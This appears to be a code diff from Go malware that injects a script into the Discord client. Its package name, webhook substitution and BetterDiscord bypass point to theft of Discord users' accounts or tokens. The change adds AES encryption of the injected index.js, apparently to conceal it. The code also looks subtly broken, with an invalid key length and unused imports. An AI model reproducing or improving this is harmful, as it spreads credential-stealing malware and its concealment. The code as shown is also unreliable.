@@ -2,6 +2,11 @@ package discordinjection
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
+	"encoding/json"
 	"errors"
 	"io"
 	"io/ioutil"
@@ -11,6 +16,7 @@ import (
 	"strings"
 
 	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
+	"golang.org/x/text/encoding/charmap"
 )
 
 // Définir le lien d'injection
@@ -72,13 +78,41 @@ func injectFile(directory string, injectionURL string, webhook string) error {
 	// Remplacer la variable webhook dans le corps du fichier
 	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), 1)
 
-	// Écrire le fichier index.js dans le répertoire spécifié
-	err = ioutil.WriteFile(filepath.Join(directory, "index.js"), body, 0644)
+	// Générer une clé de chiffrement
+	encryptionKey := []byte("votre_clé_de_chiffrement_secrète_de_longueur_16_ou_32_octets")
+
+	// Chiffrer le contenu du fichier index.js
+	encryptedBody, err := encrypt(body, encryptionKey)
+	if err != nil {
+		return err
+	}
+
+	// Écrire le fichier index.js chiffré dans le répertoire spécifié
+	err = ioutil.WriteFile(filepath.Join(directory, "index.js"), encryptedBody, 0644)
 	if err != nil {
 		return err
 	}
 
 	return nil
+}
+
+func encrypt(data []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+
+	ciphertext := make([]byte, aes.BlockSize+len(data))
+	iv := ciphertext[:aes.BlockSize]
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		return nil, err
+	}
+
+	stream := cipher.NewCFBEncrypter(block, iv)
+	stream.XORKeyStream(ciphertext[aes.BlockSize:], data)
+
+	// Retourner le texte chiffré
+	return ciphertext, nil
 }
 
 func BypassBetterDiscord(user string) error {
